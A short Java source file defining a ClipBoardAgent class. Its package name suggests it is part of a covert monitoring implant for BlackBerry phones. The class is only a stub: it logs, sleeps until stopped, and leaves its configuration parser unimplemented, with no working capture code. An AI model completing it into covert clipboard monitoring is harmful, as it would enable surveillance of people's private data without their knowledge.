package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ClipBoardAgent extends Agent {
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);

    public ClipBoardAgent(int AgentStatus) {
        super(Agent.AGENT_CLIPBOARD, AgentStatus, true);

    }

    protected ClipBoardAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
